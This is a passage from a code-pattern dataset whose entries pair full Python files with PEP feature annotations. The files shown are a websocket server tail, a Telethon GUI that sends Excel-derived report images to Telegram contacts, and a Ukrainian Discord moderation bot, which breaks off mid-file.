DATASOURCE\",DATASOURCE)\nD = stringtopoint(('0x1318ac94213e5cfcefdadefd266e08b01eda47df5f196dad869e4a478a98c45d','0x81af4c964cb9d630a45c4470c0a9b0adceab66ae3cdbd0a090339b3d97b3b92')) \nasyncio.get_event_loop().run_until_complete(\n    websockets.serve(listen, '192.168.2.71', 6789))\nasyncio.get_event_loop().run_forever()",
            "patterns": {
                "pep_567": [
                    [
                        10,
                        10,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        169,
                        183,
                        "async for",
                        "async for message in websocket:\n      data = json.loads(message)\n      cmd_id = data['cmd_id']\n      if (cmd_id == 'hello'):\n        client_address = data['address']\n        await register(client_address,websocket)\n      elif (cmd_id == 'val'):\n        v = data['data']\n        await evaluate(v, websocket)    \n      else:\n        global CLIENTS\n        cuid = uid(websocket)\n        hdl = CLIENTS[cuid]['handlers']['i_'+str(data['cmd_id'])+'_'+data['type']];\n        handler_data = CLIENTS[cuid]['handlers_data']['i_'+str(data['cmd_id'])+'_'+data['type']];\n        await handlers[hdl](websocket,handler_data,data);"
                    ]
                ]
            }
        },
        "38": {
            "file": "import asyncio\nimport functools\nimport inspect\nimport os\nimport re\nimport sys\nimport time\nimport tkinter\nimport tkinter.constants\nimport tkinter.scrolledtext\nimport tkinter.ttk\nimport tkinter.filedialog\nimport json\nfrom excel_processor import ExcelProcessor\nfrom html_formatter import prepare_body\nfrom telethon import TelegramClient, events, utils\nimport imgkit\nfrom datetime import datetime\nimport os\nimport re\ndef is_phone_number(param):\n    pattern = re.compile('^\\+9989[0-9]\\d{7}$')\n    return pattern.match(\"\".join(param.split()))\nimg_opts = {\n    \"enable-local-file-access\": None\n}\nwith open('style.css') as f:\n    css = f.read\nIMAGE = os.path.dirname(os.path.abspath(__file__)) + '/name.jpg'\nTITLE = 'Report distributor'\nSIZE = '640x280'\nREPLY = re.compile(r'\\.r\\s*(\\d+)\\s*(.+)', re.IGNORECASE)\nDELETE = re.compile(r'\\.d\\s*(\\d+)', re.IGNORECASE)\nEDIT = re.compile(r'\\.s(.+?[^\\\\])/(.*)', re.IGNORECASE)\nTEMPLATE_START_LOG = '{} - Sending started phone: {}, contract number: {}, records: {}, image count: {}\\n'\nTEMPLATE_END_LOG = '{} - Sending end.\\n'\ndef get_env(name, message, cast=str):\n    if name in os.environ:\n        return os.environ[name]\n    while True:\n        value = input(message)\n        try:\n            return cast(value)\n        except ValueError as e:\n            print(e, file=sys.stderr)\n            time.sleep(1)\nwith open('config.json', 'r') as f:\n    config = json.load(f)\nSESSION = os.environ.get('TG_SESSION', 'gui')\nAPI_ID = config['api_id']\nAPI_HASH = config['api_hash']\ndef sanitize_str(string):\n    return ''.join(x if ord(x) <= 0xffff else\n                   '{{{:x}\u016b}}'.format(ord(x)) for x in string)\ndef callback(func):\n    @functools.wraps(func)\n    def wrapped(*args, **kwargs):\n        result = func(*args, **kwargs)\n        if inspect.iscoroutine(result):\n            aio_loop.create_task(result)\n    return wrapped\ndef allow_copy(widget):\n    widget.bind('<Control-c>', lambda e: None)\n    widget.bind('<Key>', lambda e: \"break\")\nclass App(tkinter.Tk):\n    def __init__(self, client, *args, **kwargs):\n        super().__init__(*args, **kwargs)\n        self.cl = client\n        self.me = None\n        self.title(TITLE)\n        self.geometry(SIZE)\n        self.sign_in_label = tkinter.Label(self, text='Loading...')\n        self.sign_in_label.grid(row=0, column=0)\n        self.sign_in_entry = tkinter.Entry(self)\n        self.sign_in_entry.grid(row=0, column=1, sticky=tkinter.EW)\n        self.sign_in_entry.bind('<Return>', self.sign_in)\n        self.sign_in_button = tkinter.Button(self, text='...',\n                                             command=self.sign_in)\n        self.sign_in_button.grid(row=0, column=2)\n        self.code = None\n        tkinter.Label(self, text='Target:').grid(row=1, column=0)\n        self.chat = tkinter.Entry(self)\n        self.chat.grid(row=1, column=1, sticky=tkinter.EW)\n        self.columnconfigure(1, weight=1)\n        tkinter.Button(self, text='Browse',\n                       command=self.choose_file).grid(row=1, column=2)\n        self.log = tkinter.scrolledtext.ScrolledText(self)\n        allow_copy(self.log)\n        self.log.grid(row=2, column=0, columnspan=3, sticky=tkinter.NSEW)\n        self.rowconfigure(2, weight=1)\n        self.cl.add_event_handler(self.on_message, events.NewMessage)\n        self.message_ids = []\n        self.send_message_btn = tkinter.Button(self, text='Send',\n                                               command=self.send_message)\n        self.send_message_btn.grid(row=3, column=2)\n        self.cl.loop.create_task(self.post_init())\n    async def post_init(self):\n        if await self.cl.is_user_authorized():\n            self.set_signed_in(await self.cl.get_me())\n        else:\n            self.sign_in_button.configure(text='Sign in')\n            self.sign_in_label.configure(\n                text='Sign in (phone):')\n    async def on_message(self, event):\n        if event.chat_id != self.chat_id:\n            return\n        self.message_ids.append(event.id)\n        if event.out:\n            text = '>> '\n        else:\n            sender = await event.get_sender()\n            text = '<{}> '.format(sanitize_str(\n                utils.get_display_name(sender)))\n        if event.media:\n            text += '({}) '.format(event.media.__class__.__name__)\n        text += sanitize_str(event.text)\n        text += '\\n'\n        self.log.insert(tkinter.END, text)\n        self.log.yview(tkinter.END)\n    @callback\n    async def sign_in(self, event=None):\n        if await self.cl.is_user_authorized():\n            print('logging out ...')\n            await self.cl.log_out()\n            self.destroy()\n            print('log out finished')\n            return\n        value = self.sign_in_entry.get().strip()\n        if not value:\n            return\n        self.sign_in_label.configure(text='Working...')\n        self.sign_in_entry.configure(state=tkinter.DISABLED)\n        if self.code:\n            print('code inserted')\n            self.set_signed_in(await self.cl.sign_in(code=value))\n        elif ':' in value:\n            self.set_signed_in(await self.cl.sign_in(bot_token=value))\n        else:\n            print('phone inserted')\n            self.code = await self.cl.send_code_request(value)\n            self.sign_in_label.configure(text='Code:')\n            self.sign_in_entry.configure(state=tkinter.NORMAL)\n            self.sign_in_entry.delete(0, tkinter.END)\n            self.sign_in_entry.focus()\n            return\n    def set_signed_in(self, me):\n        self.me = me\n        self.sign_in_label.configure(text='Signed in')\n        self.sign_in_entry.configure(state=tkinter.NORMAL)\n        self.sign_in_entry.delete(0, tkinter.END)\n        self.sign_in_entry.insert(tkinter.INSERT, utils.get_display_name(me))\n        self.sign_in_entry.configure(state=tkinter.DISABLED)\n        self.sign_in_button.configure(text='Log out')\n        self.chat.focus()\n    @callback\n    async def send_message(self, event=None):\n        if not self.cl.is_connected():\n            return\n        self.chat.configure(state=tkinter.DISABLED)\n        self.send_message_btn.configure(state=tkinter.DISABLED)\n        excel_processor = ExcelProcessor(self.chat.get())\n        print('file is choosed', self.chat.get(), sep=' = ')\n        result = excel_processor.process_file()\n        print('Excel content is parsed. Sending started...')\n        for key in list(result.keys()):\n            text = TEMPLATE_START_LOG.format(datetime.now().strftime(\"%m/%d/%Y, %H:%M:%S\"),\n                                             result[key].phone,\n                                             result[key].contract,\n                                             result[key].count,\n                                             len(result[key].contents))\n            self.log.insert(tkinter.END, text)\n            self.log.yview(tkinter.END)\n            user = await self.cl.get_entity(result[key].phone) if is_phone_number(result[key].phone) else await self.get_private_group(result[key].phone)\n            print(\"user\",user, sep='=')\n            for content in result[key].contents:\n                html = prepare_body(excel_processor.header+content)\n                imgkit.from_string(html, IMAGE, options=img_opts)\n                await self.cl.send_file(user, IMAGE)\n            text = TEMPLATE_END_LOG.format(\n                datetime.now().strftime(\"%m/%d/%Y, %H:%M:%S\"))\n            self.log.insert(tkinter.END, text)\n        self.chat.configure(state=tkinter.NORMAL)\n        self.send_message_btn.configure(state=tkinter.NORMAL)\n    @callback\n    async def choose_file(self, event=None):\n        if not self.cl.is_connected():\n            return\n        self.file_name = tkinter.filedialog.askopenfile(\n            mode='r', title='Choose a file').name\n        self.chat.delete(0, tkinter.END)\n        self.chat.configure(state=tkinter.NORMAL)\n        self.chat.insert(tkinter.INSERT, self.file_name)\n        self.chat.focus()\n    async def get_private_group(self, name):\n        async for dialog in self.cl.iter_dialogs():\n            if dialog.name == name:\n               return dialog.id\nasync def main(interval=0.05):\n    client = TelegramClient(SESSION, API_ID, API_HASH)\n    try:\n        await client.connect()\n    except Exception as e:\n        print('Failed to connect', e, file=sys.stderr)\n        return\n    app = App(client)\n    try:\n        while True:\n            app.update()\n            await asyncio.sleep(interval)\n    except KeyboardInterrupt:\n        pass\n    except tkinter.TclError as e:\n        if 'application has been destroyed' not in e.args[0]:\n            raise\n    finally:\n        await app.cl.disconnect()\nif __name__ == \"__main__\":\n    aio_loop = asyncio.get_event_loop()\n    try:\n        aio_loop.run_until_complete(main())\n    finally:\n        if not aio_loop.is_closed():\n            aio_loop.close()",
            "patterns": {
                "pep_468": [
                    [
                        58,
                        "func(*args, **kwargs)"
                    ],
                    [
                        67,
                        "super().__init__(*args, **kwargs)"
                    ]
                ],
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        195,
                        197,
                        "async for",
                        "async for dialog in self.cl.iter_dialogs():\n            if dialog.name == name:\n               return dialog.id"
                    ]
                ],
                "pep_498v": [
                    [
                        112,
                        113,
                        ".format()"
                    ],
                    [
                        115,
                        115,
                        ".format()"
                    ],
                    [
                        54,
                        54,
                        ".format()"
                    ]
                ]
            }
        },
        "39": {
            "file": "import discord\nfrom discord.ext import commands\nfrom discord.ext.commands import has_permissions, CheckFailure\nfrom discord.utils import get\nimport asyncio\nimport typing\nfrom typing import Optional\nfrom discord import Permissions\nclass Admin(commands.Cog, name=\"Admin\"):\n    def __init__(self, bot):\n        self.bot = bot\n    @commands.command(pass_context = True , aliases=['\u0430\u0434\u043c\u0456\u043d', 'mod', '\u043c\u043e\u0434\u0435\u0440'])\n    @has_permissions(administrator=True, manage_messages=True, manage_roles=True)\n    async def admin(self, ctx, status = None, role=None, color=None):\n        await ctx.message.delete()\n        if status == '+':\n            self.name_role = role\n            if get(ctx.guild.roles, name= role):\n                embed = discord.Embed(color=0xfc5821, title=f':bangbang: \u0420\u043e\u043b\u044c \u0432\u0436\u0435 \u0456\u043d\u0443\u0454 \u043d\u0430 \u0441\u0435\u0440\u0432\u0435\u0440\u0456! :bangbang:')\n                embed.set_footer(text=f\"\u0421\u0438\u0441\u0442\u0435\u043c\u043d\u0435 \u043f\u043e\u0432\u0456\u0434\u043e\u043c\u043b\u0435\u043d\u043d\u044f \u0434\u043b\u044f {ctx.author}\", icon_url=ctx.author.avatar_url)\n                await(await ctx.send(embed=embed)).delete(delay=50)\n            else:\n                perms = discord.Permissions(send_messages=False, read_messages=True, read_message_history=True)\n                if color == None:\n                    color = '000000'\n                await ctx.guild.create_role(name=self.name_role, permissions=perms, colour=discord.Colour(int(color, 16)))\n                embed = discord.Embed(color=0xfc5821, title=f':white_check_mark: \u0421\u0442\u0432\u043e\u0440\u0435\u043d\u043e \u0440\u043e\u043b\u044c {role} :white_check_mark:')\n                embed.set_footer(text=f\"\u0421\u0438\u0441\u0442\u0435\u043c\u043d\u0435 \u043f\u043e\u0432\u0456\u0434\u043e\u043c\u043b\u0435\u043d\u043d\u044f \u0434\u043b\u044f {ctx.author}\", icon_url=ctx.author.avatar_url)\n                await(await ctx.send(embed=embed)).delete(delay=50)\n        else:\n            delrole = role\n            guild = ctx.guild\n            for role in guild.roles:\n                if role.name == delrole: \n                    await role.delete()\n                    embed = discord.Embed(color=0xfc5821, title=f':negative_squared_cross_mark: \u0412\u0438\u0434\u0430\u043b\u0435\u043d\u043e \u0440\u043e\u043b\u044c {delrole} :negative_squared_cross_mark:')\n                    embed.set_footer(text=f\"\u0421\u0438\u0441\u0442\u0435\u043c\u043d\u0435 \u043f\u043e\u0432\u0456\u0434\u043e\u043c\u043b\u0435\u043d\u043d\u044f \u0434\u043b\u044f {ctx.author}\", icon_url=ctx.author.avatar_url)\n                    await(await ctx.send(embed=embed)).delete(delay=50)\n    @commands.command(pass_context = True , aliases=['\u0431\u0430\u043d', '\u0437\u0430\u0431\u043b\u043e\u043a\u0443\u0432\u0430\u0442\u0438'])\n    @has_permissions(administrator=True, manage_messages=True, manage_roles=True)\n    async def ban (self, ctx, member:discord.Member = None, reason = None):\n        await ctx.message.delete()\n        member = ctx.author if not member else member\n        role = [role for role in member.roles][1:]\n        role_owner1 = [r.name for r in ctx.guild.roles][-1:]\n        role_owner2 = [role.name for role in member.roles][1:]\n        role_mod1 = [r.name for r in ctx.guild.roles][-2:-1]\n        role_mod2 = [role.name for role in member.roles][1:]\n        if set(role_mod1).issubset(role_mod2):\n            embed = discord.Embed(color=0xfc5821, title=f':bangbang: \u0412\u0438 \u043d\u0435 \u043c\u043e\u0436\u0435\u0442\u0435 \u0437\u0430\u0431\u043b\u043e\u043a\u0443\u0432\u0430\u0442\u0438 \u043c\u043e\u0434\u0435\u0440\u0430\u0442\u043e\u0440\u0430 \u0441\u0435\u0440\u0432\u0435\u0440\u0443! :bangbang:')\n            embed.set_footer(text=f\"\u0421\u0438\u0441\u0442\u0435\u043c\u043d\u0435 \u043f\u043e\u0432\u0456\u0434\u043e\u043c\u043b\u0435\u043d\u043d\u044f \u0434\u043b\u044f {ctx.author}\", icon_url=ctx.author.avatar_url)\n            await(await ctx.send(embed=embed)).delete(delay=50)\n        elif set(role_owner1).issubset(role_owner2):\n            embed = discord.Embed(color=0xfc5821, title=f':bangbang: \u0412\u0438 \u043d\u0435 \u043c\u043e\u0436\u0435\u0442\u0435 \u0437\u0430\u0431\u043b\u043e\u043a\u0443\u0432\u0430\u0442\u0438 \u0432\u043b\u0430\u0441\u043d\u0438\u043a\u0430 \u0441\u0435\u0440\u0432\u0435\u0440\u0443! :bangbang:')\n            embed.set_footer(text=f\"\u0421\u0438\u0441\u0442\u0435\u043c\u043d\u0435 \u043f\u043e\u0432\u0456\u0434\u043e\u043c\u043b\u0435\u043d\u043d\u044f \u0434\u043b\u044f {ctx.author}\", icon_url=ctx.author.avatar_url)\n            await(await ctx.send(embed=embed)).delete(delay=50)\n        else:\n            if reason == None:\n                reason = \"<\u043f\u0440\u0438\u0447\u0438\u043d\u0443 \u0431\u043b\u043e\u043a\u0443\u0432\u0430\u043d\u043d\u044f \u043d\u0435 \u0432\u043a\u0430\u0437\u0430\u043d\u043e>\"\n            message = f\"\u0412\u0430\u0441 \u0437\u0430\u0431\u043b\u043e\u043a\u0443\u0432\u0430\u043b\u0438 \u043d\u0430 \u0441\u0435\u0440\u0432\u0435\u0440\u0456 {ctx.guild.name} \u0437\u0430 {reason}\"\n            await member.send(message)\n            embed = discord.Embed(color=0x730505, title=':no_entry: \u0417\u0430\u0441\u0442\u043e\u0441\u043e\u0432\u0430\u043d\u043e \u043f\u043e\u043a\u0430\u0440\u0430\u043d\u043d\u044f :no_entry:')\n            embed.set_thumbnail(url=member.avatar_url)\n            embed.add_field(name=f\"\u041a\u043e\u0440\u0438\u0441\u0442\u0443\u0432\u0430\u0447\u0430 {member} \u0437\u0430\u0431\u043b\u043e\u043a\u043e\u0432\u0430\u043d\u043e \u0437\u0430 {reason}!\", value=\"\u0421\u043f\u043e\u0434\u0456\u0432\u0430\u0454\u043c\u043e\u0441\u044c \u0446\u0435 \u0431\u0443\u0434\u0435 \u0443\u0440\u043e\u043a\u043e\u043c \u0434\u043b\u044f \u0440\u0435\u0448\u0442\u0438.\", inline=False)\n            embed.set_footer(text=f\"\u0412\u0438\u043a\u043b\u0438\u043a\u0430\u043d\u043e {ctx.author}\", icon_url=ctx.author.avatar_url)\n            await(await ctx.send(embed=embed)).delete(delay=50)\n            await ctx.guild.ban(member, reason=reason)\n    @commands.command(pass_context = True , aliases=['\u043a\u0456\u043a', '\u0432\u0438\u0433\u043d\u0430\u0442\u0438'])\n    @has_permissions(administrator=True, manage_messages=True, manage_roles=True)\n    async def kick (self, ctx, member:discord.Member = None, reason = None):\n        await ctx.message.delete()\n        member = ctx.author if not member else member\n        role = [role for role in member.roles][1:]\n        role_owner1 = [r.name for r in ctx.guild.roles][-1:]\n        role_owner2 = [role.name for role in member.roles][1:]\n        role_mod1 = [r.name for r in ctx.guild.roles][-2:-1]\n        role_mod2 = [role.name for role in member.roles][1:]\n        if set(role_mod1).issubset(role_mod2):\n            embed = discord.Embed(color=0xfc5821, title=f':bangbang: \u0412\u0438 \u043d\u0435 \u043c\u043e\u0436\u0435\u0442\u0435 \u0432\u0438\u0433\u043d\u0430\u0442\u0438 \u043c\u043e\u0434\u0435\u0440\u0430\u0442\u043e\u0440\u0430 \u0441\u0435\u0440\u0432\u0435\u0440\u0443! :bangbang:')\n            embed.set_footer(text=f\"\u0421\u0438\u0441\u0442\u0435\u043c\u043d\u0435 \u043f\u043e\u0432\u0456\u0434\u043e\u043c\u043b\u0435\u043d\u043d\u044f \u0434\u043b\u044f {ctx.author}\", icon_url=ctx.author.avatar_url)\n            await(await ctx.send(embed=embed)).delete(delay=50)\n        elif set(role_owner1).issubset(role_owner2):\n            embed = discord.Embed(color=0xfc5821, title=f':bangbang: \u0412\u0438 \u043d\u0435 \u043c\u043e\u0436\u0435\u0442\u0435 \u0432\u0438\u0433\u043d\u0430\u0442\u0438 \u0432\u043b\u0430\u0441\u043d\u0438\u043a\u0430 \u0441\u0435\u0440\u0432\u0435\u0440\u0443! :bangbang:')\n            embed.set_footer(text=f\"\u0421\u0438\u0441\u0442\u0435\u043c\u043d\u0435 \u043f\u043e\u0432\u0456\u0434\u043e\u043c\u043b\u0435\u043d\u043d\u044f \u0434\u043b\u044f {ctx.author}\", icon_url=ctx.author.avatar_url)\n            await(await ctx.send(embed=embed)).delete(delay=50)\n        else:\n            if reason == None:\n                reason = \"<\u043f\u0440\u0438\u0447\u0438\u043d\u0443 \u0431\u043b\u043e\u043a\u0443\u0432\u0430\u043d\u043d\u044f \u043d\u0435 \u0432\u043a\u0430\u0437\u0430\u043d\u043e>\"\n            message = f\"\u0412\u0430\u0441 \u0432\u0438\u0433\u043d\u0430\u043b\u0438 \u0456\u0437 \u0441\u0435\u0440\u0432\u0435\u0440\u0443 {ctx.guild.name} \u0437\u0430 {reason}\"\n            await member.send(message)\n            embed = discord.Embed(color=0x730505, title=':no_entry: \u0417\u0430\u0441\u0442\u043e\u0441\u043e\u0432\u0430\u043d\u043e \u043f\u043e\u043a\u0430\u0440\u0430\u043d\u043d\u044f :no_entry:')\n            embed.set_thumbnail(url=member.avatar_url)\n            embed.add_field(name=f\"\u041a\u043e\u0440\u0438\u0441\u0442\u0443\u0432\u0430\u0447\u0430 {member} \u0432\u0438\u043a\u043b\u044e\u0447\u0435\u043d\u043e \u0456\u0437 \u0441\u0435\u0440\u0432\u0435\u0440\u0443 \u0437\u0430 {reason}!\", value=\"\u0421\u043f\u043e\u0434\u0456\u0432\u0430\u0454\u043c\u043e\u0441\u044c \u0446\u0435 \u0431\u0443\u0434\u0435 \u0443\u0440\u043e\u043a\u043e\u043c \u0434\u043b\u044f \u0440\u0435\u0448\u0442\u0438.\", inline=False)\n            embed.set_footer(text=f\"\u0412\u0438\u043a\u043b\u0438\u043a\u0430\u043d\u043e {ctx.author}\", icon_url=ctx.author.avatar_url)\n            await(await ctx.send(embed=embed)).delete(delay=50)\n            await ctx.guild.kick(member, reason=reason)\n    @commands.command(pass_context = True , aliases=['\u043c\u044e\u0442', '\u0437\u0430\u0433\u043b\u0443\u0448\u0438\u0442\u0438'])\n    @has_permissions(administrator=True, manage_messages=True)\n    async def mute (self, ctx, member:discord.Member = None, time : int = None, reason=None):\n        await ctx.message.delete()\n        member = ctx.author if not member else member\n        role = [role for role in member.roles][1:]\n        role_owner1 = [r.name for r in ctx.guild.roles][-1:]\n        role_owner2 = [role.name for role in member.roles][1:]\n        role_mod1 = [r.name for r in ctx.guild.roles][-2:-1]\n        role_mod2 = [role.name for role in member.roles][1:]\n        case = None\n        if set(role_mod1).issubset(role_mod2):\n            embed = discord.Embed(color=0xfc5821, title=f':bangbang: \u0412\u0438 \u043d\u0435 \u043c\u043e\u0436\u0435\u0442\u0435 \u0437\u0430\u0433\u043b\u0443\u0448\u0438\u0442\u0438 \u043c\u043e\u0434\u0435\u0440\u0430\u0442\u043e\u0440\u0430 \u0441\u0435\u0440\u0432\u0435\u0440\u0443! :bangbang:')\n            embed.set_footer(text=f\"\u0421\u0438\u0441\u0442\u0435\u043c\u043d\u0435 \u043f\u043e\u0432\u0456\u0434\u043e\u043c\u043b\u0435\u043d\u043d\u044f \u0434\u043b\u044f {ctx.author}\", icon_url=ctx.author.avatar_url)\n            await(await ctx.send(embed=embed)).delete(delay=50)\n        elif set(role_owner1).issubset(role_owner2):\n            embed = discord.Embed(color=0xfc5821, title=f':bangbang: \u0412\u0438 \u043d\u0435 \u043c\u043e\u0436\u0435\u0442\u0435 \u0437\u0430\u0433\u043b\u0443\u0448\u0438\u0442\u0438 \u0432\u043b\u0430\u0441\u043d\u0438\u043a\u0430 \u0441\u0435\u0440\u0432\u0435\u0440\u0443! :bangbang:')\n            embed.set_footer(text=f\"\u0421\u0438\u0441\u0442\u0435\u043c\u043d\u0435 \u043f\u043e\u0432\u0456\u0434\u043e\u043c\u043b\u0435\u043d\u043d\u044f \u0434\u043b\u044f {ctx.author}\", icon_url=ctx.author.avatar_url)\n            await(await ctx.send(embed=embed)).delete(delay=50)\n        elif [r for r in ctx.guild.roles if r.name == self.name_role][0] == member.top_role:\n            embed = discord.Embed(color=0xfc5821, title=f':bangbang: \u0412\u0438 \u043d\u0435 \u043c\u043e\u0436\u0435\u0442\u0435 \u0437\u0430\u0433\u043b\u0443\u0448\u0438\u0442\u0438 \u043a\u043e\u0440\u0438\u0441\u0442\u0443\u0432\u0430\u0447\u0430, \u044f\u043a\u0438\u0439 \u0432\u0436\u0435 \u0454 \u0437\u0430\u0433\u043b\u0443\u0448\u0435\u043d\u0438\u043c! :bangbang:')\n            embed.set_footer(text=f\"\u0421\u0438\u0441\u0442\u0435\u043c\u043d\u0435 \u043f\u043e\u0432\u0456\u0434\u043e\u043c\u043b\u0435\u043d\u043d\u044f \u0434\u043b\u044f {ctx.author}\", icon_url=ctx.author.avatar_url)\n            await(await ctx.send(embed=embed)).delete(delay=50)\n        else:\n            await member.remove_roles(*role)\n            role = discord.utils.get(member.guild.roles, name=self.name_role)\n            await member.add_roles(role)\n            if reason == None:\n                reason = \"<\u043f\u0440\u0438\u0447\u0438\u043d\u0443 \u0431\u043b\u043e\u043a\u0443\u0432\u0430\u043d\u043d\u044f \u043d\u0435 \u0432\u043a\u0430\u0437\u0430\u043d\u043e>\"\n                case = ''\n            if time == None:\n                time = \"\u043d\u0430 \u0447\u0430\u0441 \u0434\u043e \u0440\u043e\u0437\u0431\u043b\u043e\u043a\u0443\u0432\u0430\u043d\u043d\u044f \u043c\u043e\u0434\u0435\u0440\u0430\u0442\u043e\u0440\u0430\u043c\u0438\"\n            elif time == 1 or time == 21 or time == 31 or time == 41:\n                case = '\u0445\u0432\u0438\u043b\u0438\u043d\u0443'\n            elif time == 2 or time == 3 or time == 4 or time == 22 or time == 23 or time == 24 or time == 32 or time == 33 or time == 34 or time == 42 or time == 43 or time == 44:\n                case = '\u0445\u0432\u0438\u043b\u0438\u043d\u0438'\n            elif time > 48:\n                case = '\u0434\u0435\u043a\u0456\u043b\u044c\u043a\u0430 \u0434\u043d\u0456\u0432'\n                time = ''\n            else:\n                case = '\u0445\u0432\u0438\u043b\u0438\u043d'\n            embed = discord.Embed(color=0x730505, title=':no_entry: \u0417\u0430\u0441\u0442\u043e\u0441\u043e\u0432\u0430\u043d\u043e \u043f\u043e\u043a\u0430\u0440\u0430\u043d\u043d\u044f :no_entry:')\n            embed.set_thumbnail(url=member.avatar_url)\n            embed.add_field(name=f\"\u041a\u043e\u0440\u0438\u0441\u0442\u0443\u0432\u0430\u0447\u0430 {member} \u0437\u0430\u0433\u043b\u0443\u0448\u0435\u043d\u043e \u0437\u0430 {reason} \u043d\u0430 {time} {case}!\", value=\"\u0423\u0432\u0430\u0436\u043d\u043e \u043f\u0440\u043e\u0447\u0438\u0442\u0430\u0439\u0442\u0435 \u043f\u0440\u0430\u0432\u0438\u043b\u0430 \u0441\u0435\u0440\u0432\u0435\u0440\u0443.\", inline=False)\n            embed.set_footer(text=f\"\u0412\u0438\u043a\u043b\u0438\u043a\u0430\u043d\u043e {ctx.author}\", icon_url=ctx.author.avatar_url)\n            await(await ctx.send(embed=embed)).delete(delay=50)\n            if time != 0 or time !=None:\n                await asyncio.sleep(time*60)\n                await member.remove_roles(role)\n                embed = discord.Embed(color=0x63ff52, title=':white_check_mark: \u0417\u043d\u044f\u0442\u043e \u043f\u043e\u043a\u0430\u0440\u0430\u043d\u043d\u044f :white_check_mark:')\n                embed.set_thumbnail(url=member.avatar_url)\n                embed.add_field(name=f\"\u041a\u043e\u0440\u0438\u0441\u0442\u0443\u0432\u0430\u0447\u0430 {member} \u0440\u043e\u0437\u0433\u043b\u0443\u0448\u0435\u043d\u043e\", value=\"\u0421\u043f\u043e\u0434\u0456\u0432\u0430\u0454\u043c\u043e\u0441\u044c \u0432\u0438 \u0443\u0441\u0432\u0456\u0434\u043e\u043c\u0438\u043b\u0438 \u0441\u0432\u043e\u044e \u043f\u043e\u043c\u0438\u043b\u043a\u0443.\", inline=False)\n                embed.set_footer(text=f\"\u0412\u0438\u043a\u043b\u0438\u043a\u0430\u043d\u043e {ctx.author}\", icon_url=ctx.author.avatar_url)\n                await(await ctx.send(embed=embed)).delete(delay=50)\n    @commands.command(pass_context = True , aliases=['\u0430\u043d\u043c\u044e\u0442', '\u0440\u043e\u0437\u0433\u043b\u0443\u0448\u0438\u0442\u0438'])\n    @has_permissions(administrator=True, manage_messages=True, manage_roles=True)\n    async def unmute (self, ctx, member:discord.Member = None):\n        await ctx.message.delete()\n        member = ctx.author if not member else member\n        role = [role for role in member.roles][1:]\n        role_owner1 = [r.name for r in ctx.guild.roles][-1:]\n        role_owner2 = [role.name for role in member.roles][1:]\n        role_mod1 = [r.name for r in ctx.guild.roles][-2:-1]\n        role_mod2 = [role.name for role in member.roles][1:]\n        role_used = [r for r in ctx.guild.roles if r.name == self.name_role][0]\n        if set(role_mod1).issubset(role_mod2):\n            embed = discord.Embed(color=0xfc5821, title=f':bangbang: \u0412\u0438 \u043d\u0435 \u043c\u043e\u0436\u0435\u0442\u0435 \u0440\u043e\u0437\u0433\u043b\u0443\u0448\u0438\u0442\u0438 \u043c\u043e\u0434\u0435\u0440\u0430\u0442\u043e\u0440\u0430 \u0441\u0435\u0440\u0432\u0435\u0440\u0443! :bangbang:')\n            embed.set_footer(text=f\"\u0421\u0438\u0441\u0442\u0435\u043c\u043d\u0435 \u043f\u043e\u0432\u0456\u0434\u043e\u043c\u043b\u0435\u043d\u043d\u044f \u0434\u043b\u044f {ctx.author}\", icon_url=ctx.author.avatar_url)\n            await(await ctx.send(embed=embed)).delete(delay=50)\n        elif set(role_owner1).issubset(role_owner2):\n            embed = discord.Embed(color=0xfc5821, title=f':bangbang: \u0412\u0438 \u043d\u0435 \u043c\u043e\u0436\u0435\u0442\u0435 \u0440\u043e\u0437\u0433\u043b\u0443\u0448\u0438\u0442\u0438 \u0432\u043b\u0430\u0441\u043d\u0438\u043a\u0430 \u0441\u0435\u0440\u0432\u0435\u0440\u0443! :bangbang:')\n            embed.set_footer(text=f\"\u0421\u0438\u0441\u0442\u0435\u043c\u043d\u0435 \u043f\u043e\u0432\u0456\u0434\u043e\u043c\u043b\u0435\u043d\u043d\u044f \u0434\u043b\u044f {ctx.author}\", icon_url=ctx.author.avatar_url)\n            await(await ctx.send(embed=embed)).delete(delay=50)\n        elif role_used.mention != member.top_role.mention:\n            embed = discord.Embed(color=0xfc5821, title=f':bangbang: \u041a\u043e\u0440\u0438\u0441\u0442\u0443\u0432\u0430\u0447 {member.name} \u043d\u0435 \u0454 \u0437\u0430\u0433\u043b\u0443\u0448\u0435\u043d\u0438\u043c \u043d\u0430 \u0434\u0430\u043d\u043e\u043c\u0443 \u0441\u0435\u0440\u0432\u0435\u0440\u0456! :bangbang:')\n            embed.set_footer(text=f\"\u0421\u0438\u0441\u0442\u0435\u043c\u043d\u0435 \u043f\u043e\u0432\u0456\u0434\u043e\u043c\u043b\u0435\u043d\u043d\u044f \u0434\u043b\u044f {ctx.author}\", icon_url=ctx.author.avatar_url)\n            await(await ctx.send(embed=embed)).delete(delay=50)\n        else:\n            await member.remove_roles(*role)\n            embed = discord.Embed(color=0x63ff52, title=':white_check_mark: \u0417\u043d\u044f\u0442\u043e \u043f\u043e\u043a\u0430\u0440\u0430\u043d\u043d\u044f :white_check_mark:')\n            embed.set_thumbnail(url=member.avatar_url)\n            embed.add_field(name=f\"\u041a\u043e\u0440\u0438\u0441\u0442\u0443\u0432\u0430\u0447\u0430 {member} \u0440\u043e\u0437\u0433\u043b\u0443\u0448\u0435\u043d\u043e\", value=\"\u0421\u043f\u043e\u0434\u0456\u0432\u0430\u0454\u043c\u043e\u0441\u044c \u0432\u0438 \u0443\u0441\u0432\u0456\u0434\u043e\u043c\u0438\u043b\u0438 \u0441\u0432\u043e\u044e \u043f\u043e\u043c\u0438\u043b\u043a\u0443.\", inline=False)\n            embed.set_footer(text=f\"\u0412\u0438\u043a\u043b\u0438\u043a\u0430\u043d\u043e {ctx.author}\", icon_url=ctx.author.avatar_url)\n            await(await ctx.send(embed=embed)).delete(delay=50)\n    @commands.command(pass_context=True, aliases=['del', '\u043e\u0447\u0438\u0441\u0442\u0438\u0442\u0438', '\u0447\u0438\u0441\u0442\u0438\u0442\u0438'])\n    @has_permissions(administrator=True, manage_messages=True, manage_roles=True)\n    async def clear(self, ctx, amount):\n        channel = ctx.message.channel\n        if amount > 100:\n            embed = discord.Embed(color=0xfc5821, title=f':bangbang: \u0412\u0438 \u043d\u0435 \u043c\u043e\u0436\u0435\u0442\u0435 \u0432\u0438\u0434\u0430\u043b\u0438\u0442\u0438 